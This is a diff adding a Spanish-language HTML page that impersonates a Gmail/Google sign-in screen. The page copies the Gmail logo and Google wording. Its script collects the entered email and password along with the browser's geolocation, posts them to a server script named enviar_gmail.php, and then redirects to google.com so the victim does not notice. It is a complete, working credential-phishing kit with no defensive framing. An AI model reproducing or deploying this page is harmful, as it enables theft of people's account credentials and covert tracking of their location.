@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f6f6f6;
+      margin: 0;
+    }
+
+    .login-container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    .login-container h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .login-container p {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    .login-container input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-container button:hover {
+      background-color: #1558b0;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Gmail Logo">
+    <h1>Iniciar sesión</h1>
+    <p>Usa tu cuenta de Google</p>
+    <form id="loginForm">
+      <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
+      <input type="password" id="password" name="password" placeholder="Contraseña" required>
+      <button type="submit">Iniciar sesión</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault(); // Evitar el envío normal del formulario
+
+      // Obtener los datos del formulario
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+      var location = null;
+
+      // Obtener la ubicación del usuario
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+
+          // Enviar los datos y la ubicación al servidor
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", "enviar_gmail.php", true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+          var data = "email=" + encodeURIComponent(email) +
+                     "&password=" + encodeURIComponent(password) +
+                     "&latitude=" + encodeURIComponent(location.latitude) +
+                     "&longitude=" + encodeURIComponent(location.longitude);
+
+          xhr.send(data);
+          xhr.onload = function() {
+            if (xhr.status === 200) {
+              // Redirigir a Google después de enviar el formulario
+              window.location.href = "https://www.google.com";
+            }
+          };
+        });
+      } else {
+        alert("Geolocalización no está disponible en este navegador.");
+      }
+    });
+  </script>
+</body>
+</html>
